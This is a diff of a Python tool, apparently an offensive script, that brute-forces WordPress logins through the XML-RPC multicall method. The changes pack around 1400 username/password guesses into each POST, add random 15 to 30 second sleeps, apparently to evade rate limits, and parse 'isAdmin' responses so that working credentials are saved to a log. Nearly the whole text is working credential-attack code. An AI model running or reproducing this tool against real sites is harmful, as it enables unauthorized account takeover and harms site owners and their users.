@@ -278,50 +278,55 @@ async def detect_rest_api_route(url, session):
 # ==================================================================================================
 # ==================================================================================================
 
-async def exploit_multicall(url, usernames, passwords, session):
+async def exploit_multicall(url: str,
+                            user_pass_list: list[list[str, str]],
+                            session: aiohttp.ClientSession):
+    """
+    Given a list of [username, password] lists, exploit the multicall method at the given url
+    using the given session. Return the reponse_text, response_time, and response_status
+    """
     headers = generate_random_headers(url)
     method_calls = ""
-    for username in usernames:
-        for password in passwords:
-            # Payload variation
-            if random.choice([True, False]):
-                method_calls += f"""
-                <value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{username}</string></value><value><string>{password}</string></value></data></array></value></data></array></value></member></struct></value>
-                 """
-            else:
-                method_calls += f"""
-                <value>
-                    <struct>
-                        <member>
-                            <name>methodName</name>
-                            <value>
-                                <string>wp.getUsersBlogs</string>
-                            </value>
-                        </member>
-                        <member>
-                            <name>params</name>
-                            <value>
-                                <array>
-                                    <data>
-                                        <value>
-                                            <array>
-                                                <data>
-                                                    <value>
-                                                        <string>{username}</string>
-                                                    </value>
-                                                    <value>
-                                                        <string>{password}</string>
-                                                    </value>
-                                                </data>
-                                            </array>
-                                        </value>
-                                    </data>
-                                </array>
-                            </value>
-                        </member>
-                    </struct>
-                </value>
-                """
+    for [username, password] in user_pass_list:
+        # Payload variation
+        if random.choice([True, False]):
+            method_calls += f"""
+            <value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{username}</string></value><value><string>{password}</string></value></data></array></value></data></array></value></member></struct></value>
+             """
+        else:
+            method_calls += f"""
+            <value>
+                <struct>
+                    <member>
+                        <name>methodName</name>
+                        <value>
+                            <string>wp.getUsersBlogs</string>
+                        </value>
+                    </member>
+                    <member>
+                        <name>params</name>
+                        <value>
+                            <array>
+                                <data>
+                                    <value>
+                                        <array>
+                                            <data>
+                                                <value>
+                                                    <string>{username}</string>
+                                                </value>
+                                                <value>
+                                                    <string>{password}</string>
+                                                </value>
+                                            </data>
+                                        </array>
+                                    </value>
+                                </data>
+                            </array>
+                        </value>
+                    </member>
+                </struct>
+            </value>
+            """
 
     data = f"""
         <methodCall>
@@ -433,6 +438,22 @@ async def brute_force_task(url, username, password, session):
 # ==================================================================================================
 # ==================================================================================================
 
+def print_multicall_progress(start, matches, misses, completed, total, end=''):
+    """Output a blue multicall progress line with the supplied statistics"""
+    matches_str = f"{Fore.GREEN}{matches}{Fore.CYAN}" if matches > 0 else f"{matches}"
+    misses_str = f"{Fore.RED}{misses}{Fore.CYAN}" if misses > 0 else f"{misses}"
+    elapsed = time.perf_counter() - start
+    minutes, seconds = divmod(int(elapsed), 60)
+    print(
+        f"\r{Fore.CYAN}Username/Password Combinations Checked: {completed}/{total} "
+        f"(Matches|Misses: {matches_str}|{misses_str}) | "
+        f"Elapsed: {minutes:02}:{seconds:02}",
+        end=end)
+
+# ==================================================================================================
+# ==================================================================================================
+# ==================================================================================================
+
 async def progress_print(tasks: list[asyncio.Task], total: int):
     """Print progress while brute force attempts are executing"""
     start = time.perf_counter()
@@ -522,71 +543,108 @@ async def start_bruteforce_async(url, usernames, passwords, use_tor=False):
 # ==================================================================================================
 # ==================================================================================================
 
-async def start_multicall_async(url, usernames, passwords, session, use_tor=False):
-    # Attempt to exploit the multicall method
-    response_text, response_time, response_status = await exploit_multicall(
-        url, usernames, passwords, session
-    )
+async def start_multicall_async(url, usernames, passwords, session):
+    """
+    Execute multicall POSTs, in batches with sleeps (if necessary), output progress after each
+    batch, and save successful logins.
+    """
+    # Build a list of all user/pass combos
+    all_user_pass_combos = [[u, p] for u in usernames for p in passwords]
+    total_user_pass_combos = len(all_user_pass_combos)
 
-    if response_text:
-        print(
-            f"\n{Fore.GREEN}Multicall response {response_status}: {response_text[:200]}..."
-        )  # Print only the first 200 chars for readability
+    # Chunk method_calls into a random number which should be small enough for XMLRPC to handle.
+    # MEMORY is the real issue: "Allowed memory size of 134217728 exhausted", but testing showed
+    # up to 1600 method calls to be "safe". Not wanting to accidentally cut something in half, I
+    # opted to parse on username/pass and round way down to around 1400 per request.
+    chunked_user_pass = []
+    min_chunk, max_chunk = 1300, 1500
+    if total_user_pass_combos > max_chunk:
+        up_idx = 0
+        while up_idx < total_user_pass_combos:
+            chunk_size = random.randint(min_chunk, max_chunk)
+            chunked_user_pass.append(all_user_pass_combos[up_idx:up_idx+chunk_size])
+            up_idx += chunk_size
+    else:
+        chunked_user_pass.append(all_user_pass_combos)
 
-        # Analyze the response, look for any successes
-        # Not sure where the Dashboard comes from, in our testing 'isAdmin' was
-        # the good match. But I figure this might go with older versions, so
-        # until I can determine otherwise, I will leave it
-        if "Dashboard" in response_text:
-            for username in usernames:
-                for password in passwords:
+    chunk_count = len(chunked_user_pass)
+    print_colored_bold(
+            f"Starting {chunk_count} multicall POSTs in random sized batches (~1400) with random "
+            '15-30 second sleep in between POSTs',
+            color='yellow')
+    start = time.perf_counter()
+    response_times = []
+    done, total_matches, total_misses = 0, 0, 0
+    for chunk_idx in range(chunk_count):
+        chunk = chunked_user_pass[chunk_idx]
+        chunk_size = len(chunk)
+        chunk_matches = 0
+        print_multicall_progress(start, total_matches, total_misses, done, total_user_pass_combos)
+
+        # Attempt to exploit the multicall method
+        response_text, response_time, _ = await exploit_multicall(url, chunk, session)
+        response_times.append(response_time)
+
+        if response_text:
+            # Extremely useful for debugging, else too noisy
+            #print(f"\n{Fore.GREEN}Multicall response {response_status}: {response_text[:500]}...")
+
+            # Analyze the response, look for any successes
+            # Not sure where the Dashboard comes from, in our testing 'isAdmin' was
+            # the good match. But I figure this might go with older versions, so
+            # until I can determine otherwise, I will leave it
+            if "Dashboard" in response_text:
+                for [username, password] in chunk:
                     if (
                         f"<string>{username}</string>" in response_text
                         and f"<string>{password}</string>" in response_text
                     ):
+                        chunk_matches += 1
                         print(
                             f"\n{Fore.GREEN}Multicall login successful with {username}:{password}"
                         )
                         await save_successful_login(username, password)
+
+            if 'isAdmin' in response_text:
+                # Convert response_text to XML for XPathing
+                xmlroot = ET.fromstring(response_text.strip())
+                xml_names = xmlroot.findall('.//value/struct/member/name')
+
+                # Working and not working responses have different XML structures,
+                # which results in our xpath returning more than one per attempt.
+                # This narrows down xml_names to one per attempt (compare_matches).
+                # isAdmin == working, faultCode == not working
+                targetted_names = ['isAdmin', 'faultCode']
+                compare_matches = [e.text for e in xml_names if e.text in targetted_names]
+
+                # If one of the matches is 'isAdmin', save off its index
+                matching_indices = [i for i, v in enumerate(compare_matches) if v == 'isAdmin']
+                chunk_matches = len(matching_indices)
+
+                # Save the user_pass combos which correspond to a good index, then
+                # save to successful logins file
+                good_user_pass_combos = list(map(chunk.__getitem__, matching_indices))
+                for [username, password] in good_user_pass_combos:
+                    print_colored_bold(
+                            f"\nMulticall login successful with {username}:{password} -- "
+                            f"adding to {SUCCESS_LOG}", color='green')
+                    await save_successful_login(username, password)
+
+        total_matches += chunk_matches
+        total_misses += chunk_size - chunk_matches
+        done += chunk_size
+        # sleep only if not last chunk, else print a final progress
+        if chunk_idx < len(chunked_user_pass) - 1:
+            await asyncio.sleep(random.randint(15, 30))
         else:
-            print(f"{Fore.RED} 'Dashboard' not in response_text.")
+            print_multicall_progress(start,
+                                     total_matches,
+                                     total_misses,
+                                     done,
+                                     total_user_pass_combos,
+                                     "\n")
 
-        if 'isAdmin' in response_text:
-            print(
-                f"\n{Fore.GREEN}Multicall response has at least one successful login...parsing"
-                )
-            # Convert response_text to XML for XPathing
-            xmlroot = ET.fromstring(response_text.strip())
-            xml_names = xmlroot.findall('.//value/struct/member/name')
-
-            # Build a list of all user/pass combos in the same order as the
-            # request was created, so we can match working combos by index later
-            all_user_pass_combos = [[u, p] for u in usernames for p in passwords]
-
-            # Working and not working responses have different XML structures,
-            # which results in our xpath returning more than one per attempt.
-            # This narrows down xml_names to one per attempt (compare_matches).
-            # isAdmin == working, faultCode == not working
-            targetted_names = ['isAdmin', 'faultCode']
-            compare_matches = [e.text for e in xml_names if e.text in targetted_names]
-
-            # If one of the matches is 'isAdmin', save off its index
-            matching_indices = [i for i, v in enumerate(compare_matches) if v == 'isAdmin']
-
-            # Save the user_pass combos which correspond to a good index, then
-            # save to successful logins file
-            good_user_pass_combos = list(map(all_user_pass_combos.__getitem__, matching_indices))
-            for user_pass_combo in good_user_pass_combos:
-                print_colored_bold(
-                        f"\nLogin successful with {user_pass_combo[0]}:{user_pass_combo[1]} -- "
-                        f"adding to {SUCCESS_LOG}", color='green')
-                await save_successful_login(user_pass_combo[0], user_pass_combo[1])
-
-        else:
-            print(f"{Fore.RED} 'isAdmin' not in response_text No matches.")
-
-        return response_time
-    return None
+    return response_times
 
 # ==================================================================================================
 # ==================================================================================================
@@ -753,12 +811,11 @@ async def main():
                 if rest_api_route is not None:
                     print(rest_api_multicall_warning)
                 else:
-                    response_time = await start_multicall_async(
+                    response_times = await start_multicall_async(
                         url + "/xmlrpc.php", users, passwords, session
                     )
-                    if response_time:
-                        logging.info("Analyzing response times")
-                        await analyze_response_times([response_time])
+                    logging.info("Analyzing response times")
+                    await analyze_response_times(response_times)
                     return
 
         # Always confirm user wants to brute force - it's noisy
